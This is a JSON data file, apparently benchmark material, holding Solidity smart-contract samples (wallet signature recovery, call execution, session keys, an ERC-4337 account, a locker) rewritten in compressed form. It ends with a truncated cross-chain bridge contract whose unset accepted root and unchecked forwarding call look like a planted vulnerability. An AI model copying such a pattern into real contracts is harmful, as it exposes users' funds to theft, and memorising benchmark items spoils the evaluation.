recoverBranch(_payload, _opHash, _signature[rindex:nrindex]);\nrindex = nrindex;\nif (internalWeight >= internalThreshold) {\nweight += externalWeight;\n}\nbytes32 node = _leafForNested(internalRoot, internalThreshold, externalWeight);\nroot = root != bytes32(0) ? LibOptim.fkeccak256(root, node) : node;\ncontinue;\n}\nif (flag == FLAG_SUBDIGEST) {\nbytes32 hardcoded;\n(hardcoded, rindex) = _signature.readBytes32(rindex);\nif (hardcoded == _opHash) {\nweight = type(uint256).max;\n}\nbytes32 node = _leafForHardcodedSubdigest(hardcoded);\nroot = root != bytes32(0) ? LibOptim.fkeccak256(root, node) : node;\ncontinue;\n}\nif (flag == FLAG_SIGNATURE_ETH_SIGN) {\nuint8 addrWeight = uint8(firstByte & 0x0f);\nif (addrWeight == 0) {\n(addrWeight, rindex) = _signature.readUint8(rindex);\n}\nbytes32 r;\nbytes32 s;\nuint8 v;\n(r, s, v, rindex) = _signature.readRSVCompact(rindex);\naddress addr = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", _opHash)), v, r, s);\nweight += addrWeight;\nbytes32 node = _leafForAddressAndWeight(addr, addrWeight);\nroot = root != bytes32(0) ? LibOptim.fkeccak256(root, node) : node;\ncontinue;\n}\nif (flag == FLAG_SIGNATURE_ANY_ADDRESS_SUBDIGEST) {\nbytes32 hardcoded;\n(hardcoded, rindex) = _signature.readBytes32(rindex);\nbytes32 anyAddressOpHash = _payload.hashFor(address(0));\nif (hardcoded == anyAddressOpHash) {\nweight = type(uint256).max;\n}\nbytes32 node = _leafForAnyAddressSubdigest(hardcoded);\nroot = root != bytes32(0) ? LibOptim.fkeccak256(root, node) : node;\ncontinue;\n}\nif (flag == FLAG_SIGNATURE_SAPIENT) {\nuint8 addrWeight = uint8(firstByte & 0x03);\nif (addrWeight == 0) {\n(addrWeight, rindex) = _signature.readUint8(rindex);\n}\naddress addr;\n(addr, rindex) = _signature.readAddress(rindex);\nuint256 size;\n{\nuint256 sizeSize = uint8(firstByte & 0x0c) >> 2;\n(size, rindex) = _signature.readUintX(rindex, sizeSize);\n}\nuint256 nrindex = rindex + size;\nbytes32 sapientImageHash = ISapient(addr).recoverSapientSignature(_payload, _signature[rindex:nrindex]);\nrindex = nrindex;\nweight += addrWeight;\nbytes32 node = _leafForSapient(addr, addrWeight, sapientImageHash);\nroot = root != bytes32(0) ? LibOptim.fkeccak256(root, node) : node;\ncontinue;\n}\nif (flag == FLAG_SIGNATURE_SAPIENT_COMPACT) {\nuint8 addrWeight = uint8(firstByte & 0x03);\nif (addrWeight == 0) {\n(addrWeight, rindex) = _signature.readUint8(rindex);\n}\naddress addr;\n(addr, rindex) = _signature.readAddress(rindex);\nuint256 sizeSize = uint8(firstByte & 0x0c) >> 2;\nuint256 size;\n(size, rindex) = _signature.readUintX(rindex, sizeSize);\nuint256 nrindex = rindex + size;\nbytes32 sapientImageHash =\nISapientCompact(addr).recoverSapientSignatureCompact(_opHash, _signature[rindex:nrindex]);\nrindex = nrindex;\nweight += addrWeight;\nbytes32 node = _leafForSapient(addr, addrWeight, sapientImageHash);\nroot = root != bytes32(0) ? LibOptim.fkeccak256(root, node) : node;\ncontinue;\n}\nrevert InvalidSignatureFlag(flag);\n}\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 106,
        "mode": "compressed",
        "original_lines": 500,
        "transformed_lines": 301,
        "original_chars": 18862,
        "transformed_chars": 11205,
        "compression_ratio": 0.59
      },
      "error": null
    },
    {
      "original_id": "sn_gs_030",
      "transformed_id": "ss_l1_compressed_sn_gs_030",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.27;\nimport { LibOptim } from \"../utils/LibOptim.sol\";\nimport { Nonce } from \"./Nonce.sol\";\nimport { Payload } from \"./Payload.sol\";\nimport { ReentrancyGuard } from \"./ReentrancyGuard.sol\";\nimport { BaseAuth } from \"./auth/BaseAuth.sol\";\nimport { IDelegatedExtension } from \"./interfaces/IDelegatedExtension.sol\";\nabstract contract Calls is ReentrancyGuard, BaseAuth, Nonce {\nevent CallSucceeded(bytes32 _opHash, uint256 _index);\nevent CallFailed(bytes32 _opHash, uint256 _index, bytes _returnData);\nevent CallAborted(bytes32 _opHash, uint256 _index, bytes _returnData);\nevent CallSkipped(bytes32 _opHash, uint256 _index);\nerror Reverted(Payload.Decoded _payload, uint256 _index, bytes _returnData);\nerror InvalidSignature(Payload.Decoded _payload, bytes _signature);\nerror NotEnoughGas(Payload.Decoded _payload, uint256 _index, uint256 _gasLeft);\nfunction execute(bytes calldata _payload, bytes calldata _signature) external payable virtual nonReentrant {\nuint256 startingGas = gasleft();\nPayload.Decoded memory decoded = Payload.fromPackedCalls(_payload);\n_consumeNonce(decoded.space, decoded.nonce);\n(bool isValid, bytes32 opHash) = signatureValidation(decoded, _signature);\nif (!isValid) {\nrevert InvalidSignature(decoded, _signature);\n}\n_execute(startingGas, opHash, decoded);\n}\nfunction selfExecute(\nbytes calldata _payload\n) external payable virtual onlySelf {\nuint256 startingGas = gasleft();\nPayload.Decoded memory decoded = Payload.fromPackedCalls(_payload);\nbytes32 opHash = Payload.hash(decoded);\n_execute(startingGas, opHash, decoded);\n}\nfunction _execute(uint256 _startingGas, bytes32 _opHash, Payload.Decoded memory _decoded) private {\nbool errorFlag = false;\nuint256 numCalls = _decoded.calls.length;\nfor (uint256 i = 0; i < numCalls; i++) {\nPayload.Call memory call = _decoded.calls[i];\nif (call.onlyFallback && !errorFlag) {\nemit CallSkipped(_opHash, i);\ncontinue;\n}\nerrorFlag = false;\nuint256 gasLimit = call.gasLimit;\nif (gasLimit != 0 && gasleft() < gasLimit) {\nrevert NotEnoughGas(_decoded, i, gasleft());\n}\nbool success;\nif (call.delegateCall) {\n(success) = LibOptim.delegatecall(\ncall.to,\ngasLimit == 0 ? gasleft() : gasLimit,\nabi.encodeWithSelector(\nIDelegatedExtension.handleSequenceDelegateCall.selector,\n_opHash,\n_startingGas,\ni,\nnumCalls,\n_decoded.space,\ncall.data\n)\n);\n} else {\n(success) = LibOptim.call(call.to, call.value, gasLimit == 0 ? gasleft() : gasLimit, call.data);\n}\nif (!success) {\nif (call.behaviorOnError == Payload.BEHAVIOR_IGNORE_ERROR) {\nerrorFlag = true;\nemit CallFailed(_opHash, i, LibOptim.returnData());\ncontinue;\n}\nif (call.behaviorOnError == Payload.BEHAVIOR_REVERT_ON_ERROR) {\nrevert Reverted(_decoded, i, LibOptim.returnData());\n}\nif (call.behaviorOnError == Payload.BEHAVIOR_ABORT_ON_ERROR) {\nemit CallAborted(_opHash, i, LibOptim.returnData());\nbreak;\n}\n}\nemit CallSucceeded(_opHash, i);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 27,
        "mode": "compressed",
        "original_lines": 124,
        "transformed_lines": 83,
        "original_chars": 4222,
        "transformed_chars": 2869,
        "compression_ratio": 0.68
      },
      "error": null
    },
    {
      "original_id": "sn_gs_031",
      "transformed_id": "ss_l1_compressed_sn_gs_031",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.27;\nimport { Payload } from \"../../modules/Payload.sol\";\nimport { LibBytes } from \"../../utils/LibBytes.sol\";\nimport { LibOptim } from \"../../utils/LibOptim.sol\";\nimport { SessionErrors } from \"./SessionErrors.sol\";\nimport { SessionPermissions } from \"./explicit/IExplicitSessionManager.sol\";\nimport { LibPermission, Permission } from \"./explicit/Permission.sol\";\nimport { Attestation, LibAttestation } from \"./implicit/Attestation.sol\";\nusing LibBytes for bytes;\nusing LibAttestation for Attestation;\nlibrary SessionSig {\nuint256 internal constant FLAG_PERMISSIONS = 0;\nuint256 internal constant FLAG_NODE = 1;\nuint256 internal constant FLAG_BRANCH = 2;\nuint256 internal constant FLAG_BLACKLIST = 3;\nuint256 internal constant FLAG_IDENTITY_SIGNER = 4;\nuint256 internal constant MIN_ENCODED_PERMISSION_SIZE = 94;\nstruct CallSignature {\nbool isImplicit;\naddress sessionSigner;\nuint8 sessionPermission;\nAttestation attestation;\n}\nstruct DecodedSignature {\nbytes32 imageHash;\naddress identitySigner;\naddress[] implicitBlacklist;\nSessionPermissions[] sessionPermissions;\nCallSignature[] callSignatures;\n}\nfunction recoverSignature(\nPayload.Decoded calldata payload,\nbytes calldata encodedSignature\n) internal view returns (DecodedSignature memory sig) {\nuint256 pointer = 0;\nbool hasBlacklistInConfig;\n{\nuint256 dataSize;\n(dataSize, pointer) = encodedSignature.readUint24(pointer);\n(sig, hasBlacklistInConfig) = recoverConfiguration(encodedSignature[pointer:pointer + dataSize]);\npointer += dataSize;\nif (sig.identitySigner == address(0)) {\nrevert SessionErrors.InvalidIdentitySigner();\n}\n}\nAttestation[] memory attestationList;\n{\nuint8 attestationCount;\n(attestationCount, pointer) = encodedSignature.readUint8(pointer);\nattestationList = new Attestation[](attestationCount);\nfor (uint256 i = 0; i < attestationCount; i++) {\nAttestation memory att;\n(att, pointer) = LibAttestation.fromPacked(encodedSignature, pointer);\n{\nbytes32 r;\nbytes32 s;\nuint8 v;\n(r, s, v, pointer) = encodedSignature.readRSVCompact(pointer);\nbytes32 attestationHash = att.toHash();\naddress recoveredIdentitySigner = ecrecover(attestationHash, v, r, s);\nif (recoveredIdentitySigner != sig.identitySigner) {\nrevert SessionErrors.InvalidIdentitySigner();\n}\n}\nattestationList[i] = att;\n}\nif (attestationCount > 0 && !hasBlacklistInConfig) {\nrevert SessionErrors.InvalidBlacklist();\n}\n}\n{\nuint256 callsCount = payload.calls.length;\nsig.callSignatures = new CallSignature[](callsCount);\nfor (uint256 i = 0; i < callsCount; i++) {\nCallSignature memory callSignature;\n{\nuint8 flag;\n(flag, pointer) = encodedSignature.readUint8(pointer);\ncallSignature.isImplicit = (flag & 0x80) != 0;\nif (callSignature.isImplicit) {\nuint8 attestationIndex = uint8(flag & 0x7f);\nif (attestationIndex >= attestationList.length) {\nrevert SessionErrors.InvalidAttestation();\n}\ncallSignature.attestation = attestationList[attestationIndex];\n} else {\ncallSignature.sessionPermission = flag;\n}\n}\n{\nbytes32 r;\nbytes32 s;\nuint8 v;\n(r, s, v, pointer) = encodedSignature.readRSVCompact(pointer);\nbytes32 callHash = hashCallWithReplayProtection(payload, i);\ncallSignature.sessionSigner = ecrecover(callHash, v, r, s);\nif (callSignature.sessionSigner == address(0)) {\nrevert SessionErrors.InvalidSessionSigner(address(0));\n}\n}\nsig.callSignatures[i] = callSignature;\n}\n}\nreturn sig;\n}\nfunction recoverConfiguration(\nbytes calldata encoded\n) internal pure returns (DecodedSignature memory sig, bool hasBlacklist) {\nuint256 pointer;\nuint256 permissionsCount;\n{\nuint256 maxPermissionsSize = encoded.length / MIN_ENCODED_PERMISSION_SIZE;\nsig.sessionPermissions = new SessionPermissions[](maxPermissionsSize);\n}\nwhile (pointer < encoded.length) {\nuint256 firstByte;\n(firstByte, pointer) = encoded.readUint8(pointer);\nuint256 flag = (firstByte & 0xf0) >> 4;\nif (flag == FLAG_PERMISSIONS) {\nSessionPermissions memory nodePermissions;\nuint256 pointerStart = pointer;\n(nodePermissions.signer, pointer) = encoded.readAddress(pointer);\n(nodePermissions.chainId, pointer) = encoded.readUint256(pointer);\n(nodePermissions.valueLimit, pointer) = encoded.readUint256(pointer);\n(nodePermissions.deadline, pointer) = encoded.readUint64(pointer);\n(nodePermissions.permissions, pointer) = _decodePermissions(encoded, pointer);\n{\nbytes32 permissionHash = _leafHashForPermissions(encoded[pointerStart:pointer]);\nsig.imageHash =\nsig.imageHash != bytes32(0) ? LibOptim.fkeccak256(sig.imageHash, permissionHash) : permissionHash;\n}\nsig.sessionPermissions[permissionsCount++] = nodePermissions;\ncontinue;\n}\nif (flag == FLAG_NODE) {\nbytes32 node;\n(node, pointer) = encoded.readBytes32(pointer);\nsig.imageHash = sig.imageHash != bytes32(0) ? LibOptim.fkeccak256(sig.imageHash, node) : node;\ncontinue;\n}\nif (flag == FLAG_BRANCH) {\nuint256 size;\n{\nuint256 sizeSize = uint8(firstByte & 0x0f);\n(size, pointer) = encoded.readUintX(pointer, sizeSize);\n}\nuint256 nrindex = pointer + size;\n(DecodedSignature memory branchSig, bool branchHasBlacklist) = recoverConfiguration(encoded[pointer:nrindex]);\npointer = nrindex;\nif (branchHasBlacklist) {\nif (hasBlacklist) {\nrevert SessionErrors.InvalidBlacklist();\n}\nhasBlacklist = true;\nsig.implicitBlacklist = branchSig.implicitBlacklist;\n}\nif (branchSig.identitySigner != address(0)) {\nif (sig.identitySigner != address(0)) {\nrevert SessionErrors.InvalidIdentitySigner();\n}\nsig.identitySigner = branchSig.identitySigner;\n}\nfor (uint256 i = 0; i < branchSig.sessionPermissions.length; i++) {\nsig.sessionPermissions[permissionsCount++] = branchSig.sessionPermissions[i];\n}\nsig.imageHash =\nsig.imageHash != bytes32(0) ? LibOptim.fkeccak256(sig.imageHash, branchSig.imageHash) : branchSig.imageHash;\ncontinue;\n}\nif (flag == FLAG_BLACKLIST) {\nif (hasBlacklist) {\nrevert SessionErrors.InvalidBlacklist();\n}\nhasBlacklist = true;\nuint256 blacklistCount = uint256(firstByte & 0x0f);\nif (blacklistCount == 0x0f) {\n(blacklistCount, pointer) = encoded.readUint16(pointer);\n}\nuint256 pointerStart = pointer;\nsig.implicitBlacklist = new address[](blacklistCount);\naddress previousAddress;\nfor (uint256 i = 0; i < blacklistCount; i++) {\n(sig.implicitBlacklist[i], pointer) = encoded.readAddress(pointer);\nif (sig.implicitBlacklist[i] < previousAddress) {\nrevert SessionErrors.InvalidBlacklistUnsorted();\n}\npreviousAddress = sig.implicitBlacklist[i];\n}\nbytes32 blacklistHash = _leafHashForBlacklist(encoded[pointerStart:pointer]);\nsig.imageHash = sig.imageHash != bytes32(0) ? LibOptim.fkeccak256(sig.imageHash, blacklistHash) : blacklistHash;\ncontinue;\n}\nif (flag == FLAG_IDENTITY_SIGNER) {\nif (sig.identitySigner != address(0)) {\nrevert SessionErrors.InvalidIdentitySigner();\n}\n(sig.identitySigner, pointer) = encoded.readAddress(pointer);\nbytes32 identitySignerHash = _leafHashForIdentitySigner(sig.identitySigner);\nsig.imageHash =\nsig.imageHash != bytes32(0) ? LibOptim.fkeccak256(sig.imageHash, identitySignerHash) : identitySignerHash;\ncontinue;\n}\nrevert SessionErrors.InvalidNodeType(flag);\n}\n{\nSessionPermissions[] memory permissions = sig.sessionPermissions;\nassembly {\nmstore(permissions, permissionsCount)\n}\n}\nreturn (sig, hasBlacklist);\n}\nfunction _decodePermissions(\nbytes calldata encoded,\nuint256 pointer\n) internal pure returns (Permission[] memory permissions, uint256 newPointer) {\nuint256 length;\n(length, pointer) = encoded.readUint8(pointer);\npermissions = new Permission[](length);\nfor (uint256 i = 0; i < length; i++) {\n(permissions[i], pointer) = LibPermission.readPermission(encoded, pointer);\n}\nreturn (permissions, pointer);\n}\nfunction _leafHashForPermissions(\nbytes calldata encodedPermissions\n) internal pure returns (bytes32) {\nreturn keccak256(abi.encodePacked(uint8(FLAG_PERMISSIONS), encodedPermissions));\n}\nfunction _leafHashForBlacklist(\nbytes calldata encodedBlacklist\n) internal pure returns (bytes32) {\nreturn keccak256(abi.encodePacked(uint8(FLAG_BLACKLIST), encodedBlacklist));\n}\nfunction _leafHashForIdentitySigner(\naddress identitySigner\n) internal pure returns (bytes32) {\nreturn keccak256(abi.encodePacked(uint8(FLAG_IDENTITY_SIGNER), identitySigner));\n}\nfunction hashCallWithReplayProtection(\nPayload.Decoded calldata payload,\nuint256 callIdx\n) public view returns (bytes32 callHash) {\nreturn keccak256(\nabi.encodePacked(\npayload.noChainId ? 0 : block.chainid,\npayload.space,\npayload.nonce,\ncallIdx,\nPayload.hashCall(payload.calls[callIdx])\n)\n);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 80,
        "mode": "compressed",
        "original_lines": 411,
        "transformed_lines": 254,
        "original_chars": 14899,
        "transformed_chars": 8341,
        "compression_ratio": 0.56
      },
      "error": null
    },
    {
      "original_id": "sn_gs_032",
      "transformed_id": "ss_l1_compressed_sn_gs_032",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.18;\nimport { Calls } from \"./Calls.sol\";\nimport { ReentrancyGuard } from \"./ReentrancyGuard.sol\";\nimport { IAccount, PackedUserOperation } from \"./interfaces/IAccount.sol\";\nimport { IERC1271_MAGIC_VALUE_HASH } from \"./interfaces/IERC1271.sol\";\nimport { IEntryPoint } from \"./interfaces/IEntryPoint.sol\";\nabstract contract ERC4337v07 is ReentrancyGuard, IAccount, Calls {\nuint256 internal constant SIG_VALIDATION_FAILED = 1;\naddress public immutable entrypoint;\nerror InvalidEntryPoint(address _entrypoint);\nerror ERC4337Disabled();\nconstructor(\naddress _entrypoint\n) {\nentrypoint = _entrypoint;\n}\nfunction validateUserOp(\nPackedUserOperation calldata userOp,\nbytes32 userOpHash,\nuint256 missingAccountFunds\n) external returns (uint256 validationData) {\nif (entrypoint == address(0)) {\nrevert ERC4337Disabled();\n}\nif (msg.sender != entrypoint) {\nrevert InvalidEntryPoint(msg.sender);\n}\nif (missingAccountFunds != 0) {\nIEntryPoint(entrypoint).depositTo{ value: missingAccountFunds }(address(this));\n}\nif (this.isValidSignature(userOpHash, userOp.signature) != IERC1271_MAGIC_VALUE_HASH) {\nreturn SIG_VALIDATION_FAILED;\n}\nreturn 0;\n}\nfunction executeUserOp(\nbytes calldata _payload\n) external nonReentrant {\nif (entrypoint == address(0)) {\nrevert ERC4337Disabled();\n}\nif (msg.sender != entrypoint) {\nrevert InvalidEntryPoint(msg.sender);\n}\nthis.selfExecute(_payload);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 17,
        "mode": "compressed",
        "original_lines": 73,
        "transformed_lines": 47,
        "original_chars": 1911,
        "transformed_chars": 1389,
        "compression_ratio": 0.73
      },
      "error": null
    },
    {
      "original_id": "sn_gs_033",
      "transformed_id": "ss_l1_compressed_sn_gs_033",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.27;\nimport { Payload } from \"../Payload.sol\";\nimport { Storage } from \"../Storage.sol\";\nimport { IAuth } from \"../interfaces/IAuth.sol\";\nimport { IERC1271, IERC1271_MAGIC_VALUE_HASH } from \"../interfaces/IERC1271.sol\";\nimport { IPartialAuth } from \"../interfaces/IPartialAuth.sol\";\nimport { ISapient } from \"../interfaces/ISapient.sol\";\nimport { BaseSig } from \"./BaseSig.sol\";\nimport { SelfAuth } from \"./SelfAuth.sol\";\nusing Payload for Payload.Decoded;\nabstract contract BaseAuth is IAuth, IPartialAuth, ISapient, IERC1271, SelfAuth {\nbytes32 private constant STATIC_SIGNATURE_KEY =\nbytes32(0xc852adf5e97c2fc3b38f405671e91b7af1697ef0287577f227ef10494c2a8e86);\nerror InvalidSapientSignature(Payload.Decoded _payload, bytes _signature);\nerror InvalidSignatureWeight(uint256 _threshold, uint256 _weight);\nerror InvalidStaticSignatureExpired(bytes32 _opHash, uint256 _expires);\nerror InvalidStaticSignatureWrongCaller(bytes32 _opHash, address _caller, address _expectedCaller);\nevent StaticSignatureSet(bytes32 _hash, address _address, uint96 _timestamp);\nfunction _getStaticSignature(\nbytes32 _hash\n) internal view returns (address, uint256) {\nuint256 word = uint256(Storage.readBytes32Map(STATIC_SIGNATURE_KEY, _hash));\nreturn (address(uint160(word >> 96)), uint256(uint96(word)));\n}\nfunction _setStaticSignature(bytes32 _hash, address _address, uint256 _timestamp) internal {\nStorage.writeBytes32Map(\nSTATIC_SIGNATURE_KEY, _hash, bytes32(uint256(uint160(_address)) << 96 | (_timestamp & 0xffffffffffffffffffffffff))\n);\n}\nfunction getStaticSignature(\nbytes32 _hash\n) external view returns (address, uint256) {\nreturn _getStaticSignature(_hash);\n}\nfunction setStaticSignature(bytes32 _hash, address _address, uint96 _timestamp) external onlySelf {\n_setStaticSignature(_hash, _address, _timestamp);\nemit StaticSignatureSet(_hash, _address, _timestamp);\n}\nfunction updateImageHash(\nbytes32 _imageHash\n) external virtual onlySelf {\n_updateImageHash(_imageHash);\n}\nfunction signatureValidation(\nPayload.Decoded memory _payload,\nbytes calldata _signature\n) internal view virtual returns (bool isValid, bytes32 opHash) {\nbytes1 signatureFlag = _signature[0];\nif (signatureFlag & 0x80 == 0x80) {\nopHash = _payload.hash();\n(address addr, uint256 timestamp) = _getStaticSignature(opHash);\nif (timestamp <= block.timestamp) {\nrevert InvalidStaticSignatureExpired(opHash, timestamp);\n}\nif (addr != address(0) && addr != msg.sender) {\nrevert InvalidStaticSignatureWrongCaller(opHash, msg.sender, addr);\n}\nreturn (true, opHash);\n}\nuint256 threshold;\nuint256 weight;\nbytes32 imageHash;\n(threshold, weight, imageHash,, opHash) = BaseSig.recover(_payload, _signature, false, address(0));\nif (weight < threshold) {\nrevert InvalidSignatureWeight(threshold, weight);\n}\nisValid = _isValidImage(imageHash);\n}\nfunction recoverSapientSignature(\nPayload.Decoded memory _payload,\nbytes calldata _signature\n) external view returns (bytes32) {\naddress[] memory parentWallets = new address[](_payload.parentWallets.length + 1);\nfor (uint256 i = 0; i < _payload.parentWallets.length; i++) {\nparentWallets[i] = _payload.parentWallets[i];\n}\nparentWallets[_payload.parentWallets.length] = msg.sender;\n_payload.parentWallets = parentWallets;\n(bool isValid,) = signatureValidation(_payload, _signature);\nif (!isValid) {\nrevert InvalidSapientSignature(_payload, _signature);\n}\nreturn bytes32(uint256(1));\n}\nfunction isValidSignature(bytes32 _hash, bytes calldata _signature) external view returns (bytes4) {\nPayload.Decoded memory payload = Payload.fromDigest(_hash);\n(bool isValid,) = signatureValidation(payload, _signature);\nif (!isValid) {\nreturn bytes4(0);\n}\nreturn IERC1271_MAGIC_VALUE_HASH;\n}\nfunction recoverPartialSignature(\nPayload.Decoded memory _payload,\nbytes calldata _signature\n)\nexternal\nview\nreturns (\nuint256 threshold,\nuint256 weight,\nbool isValidImage,\nbytes32 imageHash,\nuint256 checkpoint,\nbytes32 opHash\n) {\n(threshold, weight, imageHash, checkpoint, opHash) = BaseSig.recover(_payload, _signature, false, address(0));\nisValidImage = _isValidImage(imageHash);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 39,
        "mode": "compressed",
        "original_lines": 174,
        "transformed_lines": 110,
        "original_chars": 5988,
        "transformed_chars": 4072,
        "compression_ratio": 0.68
      },
      "error": null
    },
    {
      "original_id": "sn_gs_034",
      "transformed_id": "ss_l1_compressed_sn_gs_034",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.27;\nimport \"./Wallet.sol\";\ncontract Factory {\nerror DeployFailed(address _mainModule, bytes32 _salt);\nfunction deploy(address _mainModule, bytes32 _salt) public payable returns (address _contract) {\nbytes memory code = abi.encodePacked(Wallet.creationCode, uint256(uint160(_mainModule)));\nassembly {\n_contract := create2(callvalue(), add(code, 32), mload(code), _salt)\n}\nif (_contract == address(0)) {\nrevert DeployFailed(_mainModule, _salt);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 28,
        "transformed_lines": 14,
        "original_chars": 1122,
        "transformed_chars": 469,
        "compression_ratio": 0.42
      },
      "error": null
    },
    {
      "original_id": "sn_gs_035",
      "transformed_id": "ss_l1_compressed_sn_gs_035",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity >=0.8.19 <0.9.0;\nimport {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IV2Pool} from \"../../external/IV2Pool.sol\";\nimport {IV2Router} from \"../../external/IV2Router.sol\";\nimport {IV2LockerFactory} from \"../../interfaces/extensions/v2/IV2LockerFactory.sol\";\nimport {IV2Locker} from \"../../interfaces/extensions/v2/IV2Locker.sol\";\nimport {ILocker} from \"../../interfaces/ILocker.sol\";\nimport {Locker} from \"../../Locker.sol\";\ncontract V2Locker is Locker, IV2Locker {\nusing SafeERC20 for IERC20;\naddress public immutable router;\nuint256 internal _lp;\nconstructor(\nbool _root,\naddress _owner,\naddress _pool,\naddress _router,\nuint256 _lp_,\nuint32 _lockedUntil,\naddress _beneficiary,\nuint16 _beneficiaryShare,\nuint16 _bribeableShare\n) Locker(_root, _owner, _pool, _lockedUntil, _beneficiary, _beneficiaryShare, _bribeableShare) {\nrouter = _router;\n_lp = _lp_;\n(token0, token1) = IV2Pool(pool).tokens();\n}\nfunction unlock(address _recipient) external override(Locker, ILocker) onlyLocked nonReentrant returns (uint256) {\nif (msg.sender != factory) revert NotFactory();\ndelete staked;\ndelete lockedUntil;\nIERC20(pool).safeTransfer({to: _recipient, value: _lp});\nuint256 leftover = IERC20(token0).balanceOf({account: address(this)});\nif (leftover > 0) IERC20(token0).safeTransfer({to: _recipient, value: leftover});\nleftover = IERC20(token1).balanceOf({account: address(this)});\nif (leftover > 0) IERC20(token1).safeTransfer({to: _recipient, value: leftover});\nemit Unlocked({recipient: _recipient});\nreturn _lp;\n}\nfunction stake() external override(Locker, ILocker) nonReentrant onlyOwner onlyLocked ensureGauge {\nif (staked) revert AlreadyStaked();\nstaked = true;\n_claimFees({_recipient: owner()});\nIERC20(pool).safeIncreaseAllowance({spender: address(gauge), value: _lp});\ngauge.deposit({lp: _lp});\nemit Staked();\n}\nfunction increaseLiquidity(uint256 _amount0, uint256 _amount1, uint256 _amount0Min, uint256 _amount1Min)\nexternal\noverride(ILocker, Locker)\nnonReentrant\nonlyOwner\nonlyLocked\nreturns (uint256) {\nif (_amount0 == 0 && _amount1 == 0) revert ZeroAmount();\nuint256 supplied0 = _fundLocker({_token: token0, _totalBal: _amount0});\nuint256 supplied1 = _fundLocker({_token: token1, _totalBal: _amount1});\nIERC20(token0).forceApprove({spender: router, value: _amount0});\nIERC20(token1).forceApprove({spender: router, value: _amount1});\n(uint256 amount0Deposited, uint256 amount1Deposited, uint256 liquidity) = IV2Router(router).addLiquidity({\ntokenA: token0,\ntokenB: token1,\nstable: IV2Pool(pool).stable(),\namountADesired: _amount0,\namountBDesired: _amount1,\namountAMin: _amount0Min,\namountBMin: _amount1Min,\nto: address(this),\ndeadline: block.timestamp\n});\nIERC20(token0).forceApprove({spender: router, value: 0});\nIERC20(token1).forceApprove({spender: router, value: 0});\naddress recipient = owner();\n_refundLeftover({_token: token0, _recipient: recipient, _maxAmount: supplied0});\n_refundLeftover({_token: token1, _recipient: recipient, _maxAmount: supplied1});\nif (staked) {\nIERC20(pool).safeIncreaseAllowance({spender: address(gauge), value: liquidity});\ngauge.deposit({lp: liquidity});\n}\n_lp += liquidity;\nemit LiquidityIncreased({amount0: amount0Deposited, amount1: amount1Deposited, liquidity: liquidity});\nreturn liquidity;\n}\nfunction _collectFees() internal override returns (uint256 claimed0, uint256 claimed1) {\n(claimed0, claimed1) = IV2Pool(pool).claimFees();\nuint256 share0 = _deductShare({_amount: claimed0, _token: token0});\nuint256 share1 = _deductShare({_amount: claimed1, _token: token1});\nclaimed0 -= share0;\nclaimed1 -= share1;\nif (share0 > 0 || share1 > 0) {\nemit FeesClaimed({recipient: beneficiary, claimed0: share0, claimed1: share1});\n}\n}\nfunction _collectRewards() internal override returns (uint256 claimed) {\nuint256 rewardsBefore = IERC20(rewardToken).balanceOf({account: address(this)});\ngauge.getReward({account: address(this)});\nuint256 rewardsAfter = IERC20(rewardToken).balanceOf({account: address(this)});\nclaimed = rewardsAfter - rewardsBefore;\nuint256 share = _deductShare({_amount: claimed, _token: rewardToken});\nclaimed -= share;\nif (share > 0) {\nemit RewardsClaimed({recipient: beneficiary, claimed: share});\n}\n}\nfunction lp() public view override(ILocker, Locker) returns (uint256) {\nreturn _lp;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 31,
        "mode": "compressed",
        "original_lines": 149,
        "transformed_lines": 109,
        "original_chars": 5485,
        "transformed_chars": 4366,
        "compression_ratio": 0.8
      },
      "error": null
    },
    {
      "original_id": "sn_tc_001",
      "transformed_id": "ss_l1_compressed_sn_tc_001",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ncontract BridgeReplica {\nenum MessageStatus {\nNone,\nPending,\nProcessed\n}\nmapping(bytes32 => MessageStatus) public messages;\nbytes32 public acceptedRoot;\naddress public bridgeRouter;\nmapping(uint32 => uint32) public nonces;\nevent MessageProcessed(bytes32 indexed messageHash, bool success);\nconstructor(address _bridgeRouter) {\nbridgeRouter = _bridgeRouter;\n}\nfunction process(bytes memory _message) external returns (bool success) {\nbytes32 messageHash = keccak256(_message);\nrequire(\nmessages[messageHash] != MessageStatus.Processed,\n\"Already processed\"\n);\nbytes32 root = _messageRoot(_message);\nrequire(root == acceptedRoot, \"Invalid root\");\nmessages[messageHash] = MessageStatus.Processed;\n(bool routerSuccess, ) = bridgeRouter.call(_message);\nemit MessageProcessed(messageHash, routerSuccess);\nreturn routerSuccess;\n}\nfunction _messageRoot(\nbytes memory _message\n) internal pure 